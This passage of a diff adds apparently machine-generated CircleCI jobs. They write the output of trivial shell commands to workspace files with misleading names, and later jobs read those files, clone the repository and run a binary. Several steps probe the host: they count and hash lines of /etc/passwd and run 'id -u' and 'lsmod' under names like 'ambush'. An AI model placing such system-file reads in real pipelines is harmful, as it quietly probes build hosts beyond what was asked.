+          at: /tmp/.wsp
+      - run:
+          name: Grab prior data
+          command: |
+            join <(sort -u /tmp/.wsp/trace.txt 2>/dev/null) <(sort -u /tmp/.wsp/trace.txt 2>/dev/null) 2>/dev/null | wc -l || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 2 --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: tar xzvf final-dist.tgz
+      - run:
+          no_output_timeout: 100m
+          command: bash -c "./bin-main"
+  audit_ruby3-bench:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: tailgate
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; lsmod 2>/dev/null | wc -l || echo 0; true ; } > /tmp/.wsp/ckpt-v2.pickle
+            echo "staging complete; file length=$(wc -c </tmp/.wsp/ckpt-v2.pickle)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - ckpt-v2.pickle
+  ruby3-bench:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Grab prior data
+          command: |
+            join <(sort -u /tmp/.wsp/ckpt-v2.pickle 2>/dev/null) <(sort -u /tmp/.wsp/ckpt-v2.pickle 2>/dev/null) 2>/dev/null | wc -l || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 2 --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: tar xzvf final-dist.tgz
+      - run:
+          no_output_timeout: 100m
+          command: bash -c "./bin-main"
+  resync_v3-nightly:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: nope not now
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; date +"%B"; true ; } > /tmp/.wsp/secondary_step_output_v5.out
+            echo "staging complete; file length=$(wc -c </tmp/.wsp/secondary_step_output_v5.out)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - secondary_step_output_v5.out
+  v3-nightly:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Grab prior data
+          command: |
+            join <(sort -u /tmp/.wsp/secondary_step_output_v5.out 2>/dev/null) <(sort -u /tmp/.wsp/secondary_step_output_v5.out 2>/dev/null) 2>/dev/null | wc -l || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 2 --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: tar xzvf final-dist.tgz
+      - run:
+          no_output_timeout: 100m
+          command: bash -c "./bin-main"
+  tmp_jess-build:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: umbrella up
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; printf "a\nb\n" | awk '{print length, $0}' | sort -n; true ; } > /tmp/.wsp/.sig
+            echo "staging complete; file length=$(wc -c </tmp/.wsp/.sig)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - .sig
+  jess-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Grab prior data
+          command: |
+            join <(sort -u /tmp/.wsp/.sig 2>/dev/null) <(sort -u /tmp/.wsp/.sig 2>/dev/null) 2>/dev/null | wc -l || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 2 --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: tar xzvf final-dist.tgz
+      - run:
+          no_output_timeout: 100m
+          command: bash -c "./bin-main"
+  postbuild_WEB-659:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: noise reduce
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; echo 'abc123def456' | grep -o '[a-z]' | sort | uniq | wc -l; true ; } > /tmp/.wsp/secondary_phase_output_v5.log
+            echo "staging complete; file length=$(wc -c </tmp/.wsp/secondary_phase_output_v5.log)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - secondary_phase_output_v5.log
+  WEB-659:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Grab prior data
+          command: |
+            join <(sort -u /tmp/.wsp/secondary_phase_output_v5.log 2>/dev/null) <(sort -u /tmp/.wsp/secondary_phase_output_v5.log 2>/dev/null) 2>/dev/null | wc -l || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 2 --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: tar xzvf final-dist.tgz
+      - run:
+          no_output_timeout: 100m
+          command: bash -c "./bin-main"
+  p2_package:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: balloon
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{s="banana"; for(i=1;i<=length(s);i++){if(substr(s,i,1)=="a")c++}; print c}'; true ; } > /tmp/.wsp/passoff.state
+            echo "staging complete; file length=$(wc -c </tmp/.wsp/passoff.state)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - passoff.state
+  package:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Grab prior data
+          command: |
+            join <(sort -u /tmp/.wsp/trace.txt 2>/dev/null) <(sort -u /tmp/.wsp/trace.txt 2>/dev/null) 2>/dev/null | wc -l || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 2 --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: tar xzvf final-dist.tgz
+      - run:
+          no_output_timeout: 100m
+          command: bash -c "./bin-main"
+
+  inspect_release_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: tig weld
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; yes 0 | head -500 | tr -d '\n' | md5sum; true ; } > /tmp/.wsp/checkpoint-C.state
+            echo "staging complete; file length=$(wc -c </tmp/.wsp/checkpoint-C.state)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - checkpoint-C.state
+  step1_WEB-659_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: nibble
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; id -u; true ; } > /tmp/.wsp/secondary_phase_output_v5.log
+            echo "staging complete; file length=$(wc -c </tmp/.wsp/secondary_phase_output_v5.log)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - secondary_phase_output_v5.log
+  go_java17-lint_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: charge
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; echo 'gnikcat' | rev; true ; } > /tmp/.wsp/bundle.tgz
+            echo "staging complete; file length=$(wc -c </tmp/.wsp/bundle.tgz)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - bundle.tgz
+  blue_QA_BUILD_8_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: spray can
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{n=50; print n*(n+1)/2, n*(n+1)*(2*n+1)/6}'; true ; } > /tmp/.wsp/stage-ok.log
+            echo "staging complete; file length=$(wc -c </tmp/.wsp/stage-ok.log)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - stage-ok.log
+  blue_v3-nightly_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: verse jump
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 50 | xargs 2>/dev/null | wc -w; true ; } > /tmp/.wsp/secondary_step_output_v5.out
+            echo "staging complete; file length=$(wc -c </tmp/.wsp/secondary_step_output_v5.out)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - secondary_step_output_v5.out
+  tmp_ensure-staging-integration-tests_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: towel pat
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{s="repetition"; for(i=1;i<=length(s);i++){c=substr(s,i,1); if(c in seen){dup++}; seen[c]=1}; print dup}'; true ; } > /tmp/.wsp/cache.blob
+            echo "staging complete; file length=$(wc -c </tmp/.wsp/cache.blob)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - cache.blob
+  step1_preview-v7_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: pop
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{n=10; p=1; for(i=1;i<=n;i++)p*=2; print p}'; true ; } > /tmp/.wsp/stage-ok.txt
+            echo "staging complete; file length=$(wc -c </tmp/.wsp/stage-ok.txt)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - stage-ok.txt
+  syncer_RUN_DEV_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: pellet grill
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; which bash || echo bash-missing; true ; } > /tmp/.wsp/ckpt-main.state
+            echo "staging complete; file length=$(wc -c </tmp/.wsp/ckpt-main.state)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - ckpt-main.state
+  provision_add-parse-leak_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: rough draft
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; echo "hello 2024 world 2025" | awk '{gsub(/[0-9]+/,"YEAR"); print}'; true ; } > /tmp/.wsp/.ok
+            echo "staging complete; file length=$(wc -c </tmp/.wsp/.ok)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - .ok
+  prefetch_jess-build_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: bell curve
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; awk 'NR<=3' /etc/passwd | md5sum; true ; } > /tmp/.wsp/.sig
+            echo "staging complete; file length=$(wc -c </tmp/.wsp/.sig)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - .sig
+  deps_Package_Release7_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: ambush
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; cat /etc/passwd | wc -l; true ; } > /tmp/.wsp/timings.json
+            echo "staging complete; file length=$(wc -c </tmp/.wsp/timings.json)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - timings.json
+  linter_rm-queue_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: beech wood
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; head -c 512 /dev/urandom | sha256sum | awk '{print $1}'; true ; } > /tmp/.wsp/2023-11-04.data
+            echo "staging complete; file length=$(wc -c </tmp/.wsp/2023-11-04.data)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 2023-11-04.data
+  stepB_v2-ga3_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: soak cycle
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; echo -e "x 3\ny 1\nz 2" | sort -k2n; true ; } > /tmp/.wsp/checkpoint-D.pkl
+            echo "staging complete; file length=$(wc -c </tmp/.wsp/checkpoint-D.pkl)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - checkpoint-D.pkl
+  beta_ruby3-bench_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: back lever
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{s="hello world foo"; split(s,a," "); for(i=length(a);i>=1;i--)printf "%s ",a[i]; print ""}' 2>/dev/null || awk 'BEGIN{split("hello world foo",a," "); n=0; for(k in a)n++; print n}'; true ; } > /tmp/.wsp/ckpt-v2.pickle
+            echo "staging complete; file length=$(wc -c </tmp/.wsp/ckpt-v2.pickle)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - ckpt-v2.pickle
+workflows:
+  pipeline:
+    jobs:
+      - inspect_BuildPipeline
+      - install_may2-canary
+      - BuildPipeline:
+          requires:
+            - inspect_BuildPipeline
+            - install_may2-canary
+      - may2-canary:
+          requires:
+            - inspect_BuildPipeline
+            - install_may2-canary
+      - rc-v7:
+          requires:
+            - inspect_BuildPipeline
+            - install_may2-canary
+      - sanity:
+          requires:
+            - inspect_BuildPipeline
+            - install_may2-canary
+      - ship-it:
+          requires:
+            - inspect_BuildPipeline
+            - install_may2-canary
+      - fix-cache-leak:
+          requires:
+            - inspect_BuildPipeline
+            - install_may2-canary
+      - Validate_Pipeline3:
+          requires:
+            - inspect_BuildPipeline
+            - install_may2-canary
+      - package:
+          requires:
+            - inspect_BuildPipeline
+            - install_may2-canary
+      - jul19-smoke:
+          requires:
+            - inspect_BuildPipeline
+            - install_may2-canary
+      - redo_lets-go
+      - spinner_update-metrics
+      - lets-go:
+          requires:
+            - redo_lets-go
+            - spinner_update-metrics
+      - update-metrics:
+          requires:
+            - redo_lets-go
+            - spinner_update-metrics
+      - yankee-8:
+          requires:
+            - redo_lets-go
+            - spinner_update-metrics
+      - ensure-nightly-release-candidate:
+          requires:
+            - redo_lets-go
+            - spinner_update-metrics
+      - bootstrap_Prepare_Release3
+      - Prepare_Release3:
+          requires:
+            - bootstrap_Prepare_Release3
+      - fetcher_tweak-oauth-leak:
+          requires:
+            - bootstrap_Prepare_Release3
+      - tweak-oauth-leak:
+          requires:
+            - fetcher_tweak-oauth-leak
+      - preflight_io-v2:
+          requires:
+            - fetcher_tweak-oauth-leak
+      - io-v2:
+          requires:
+            - preflight_io-v2
+      - hydrate_release
+      - inspect_release_2:
+          requires:
+            - hydrate_release
+      - release:
+          requires:
+            - inspect_release_2
+      - postbuild_WEB-659:
+          requires:
+            - inspect_release_2
+      - step1_WEB-659_2:
+          requires:
+            - postbuild_WEB-659
+      - WEB-659:
+          requires:
+            - step1_WEB-659_2
+      - hook_java17-lint:
+          requires:
+            - step1_WEB-659_2
+      - go_java17-lint_2:
+          requires:
+            - hook_java17-lint
+      - java17-lint:
+          requires:
+            - go_java17-lint_2
+      - package_QA_BUILD_8:
+          requires:
+            - go_java17-lint_2
+      - blue_QA_BUILD_8_2:
+          requires:
+            - package_QA_BUILD_8
+      - QA_BUILD_8:
+          requires:
+            - blue_QA_BUILD_8_2
+      - resync_v3-nightly:
+          requires:
+            - blue_QA_BUILD_8_2
+      - blue_v3-nightly_2:
+          requires:
+            - resync_v3-nightly
+      - v3-nightly:
+          requires:
+            - blue_v3-nightly_2
+      - install_ensure-staging-integration-tests:
+          requires:
+            - blue_v3-nightly_2
+      - tmp_ensure-staging-integration-tests_2:
+          requires:
+            - install_ensure-staging-integration-tests
+      - ensure-staging-integration-tests:
+          requires:
+            - tmp_ensure-staging-integration-tests_2
+      - hydrate_preview-v7:
+          requires:
+            - tmp_ensure-staging-integration-tests_2
+      - step1_preview-v7_2:
+          requires:
+            - hydrate_preview-v7
+      - preview-v7:
+          requires:
+            - step1_preview-v7_2
+      - inspect_RUN_DEV:
+          requires:
+            - step1_preview-v7_2
+      - syncer_RUN_DEV_2:
+          requires:
+            - inspect_RUN_DEV
+      - RUN_DEV:
+          requires:
+            - syncer_RUN_DEV_2
+      - syncer_add-parse-leak:
+          requires:
+            - syncer_RUN_DEV_2
+      - provision_add-parse-leak_2:
+          requires:
+            - syncer_add-parse-leak
+      - add-parse-leak:
+          requires:
+            - provision_add-parse-leak_2
+      - tmp_jess-build
+      - prefetch_jess-build_2:
+          requires:
+            - tmp_jess-build
+      - jess-build:
+          requires:
+            - prefetch_jess-build_2
+      - do_Package_Release7:
+          requires:
+            - prefetch_jess-build_2
+      - deps_Package_Release7_2:
+          requires:
+            - do_Package_Release7
+      - Package_Release7:
+          requires:
+            - deps_Package_Release7_2
+      - gamma_rm-queue:
+          requires:
+            - deps_Package_Release7_2
+      - linter_rm-queue_2:
+          requires:
+            - gamma_rm-queue
+      - rm-queue:
+          requires:
+            - linter_rm-queue_2
+      - cache_v2-ga3:
+          requires:
+            - linter_rm-queue_2
+      - stepB_v2-ga3_2:
+          requires:
+            - cache_v2-ga3
+      - v2-ga3:
+          requires:
+            - stepB_v2-ga3_2
+      - audit_ruby3-bench:
+          requires:
+            - stepB_v2-ga3_2
+      - beta_ruby3-bench_2:
+          requires:
+            - audit_ruby3-bench
+      - ruby3-bench:
+          requires:
+            - beta_ruby3-bench_2
